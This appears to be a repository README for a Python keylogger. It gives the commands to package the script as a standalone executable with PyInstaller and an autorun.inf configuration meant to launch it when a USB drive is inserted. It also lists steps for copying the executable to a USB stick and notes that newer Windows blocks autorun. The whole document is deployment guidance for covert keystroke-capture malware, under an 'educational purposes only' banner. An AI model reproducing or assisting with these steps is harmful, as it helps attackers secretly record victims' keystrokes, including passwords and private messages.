# A Simple Key-Logger using Python
**⚠️ WARNING: FOR EDUCATIONAL PURPOSES ONLY! ⚠️** 
 
## Prepare your environment
```
pip install pynput

```
## Package the script as an Executable
```
 pip install pyinstaller
 pyinstaller --onefile keylogger.py
```
&nbsp;
## To make the program run automatically when the USB is inserted

- Create an `autorun.inf` file to make the program run automatically when the USB is inserted (on older versions of Windows).  
  **Note:** Newer systems often disable autorun for security reasons.

```
[autorun]
open=keylogger.exe
action=Run Keylogger
icon=icon.ico
```
&nbsp;
+ This will generate a (keylogger.exe).
+ Make sure to run these command in your VS code Terminal.
+ Once you ran these commands in your terminal it will generate a (keylogger.exe) inside your dist file.
+ You need to copy only that (keylogger.exe) in to your USB and once the USB plugged in, you need to open the (keylogger.exe) manually.
+ This doesn't work on Windows 11 when the USB plugged in because of the Windows Saftey
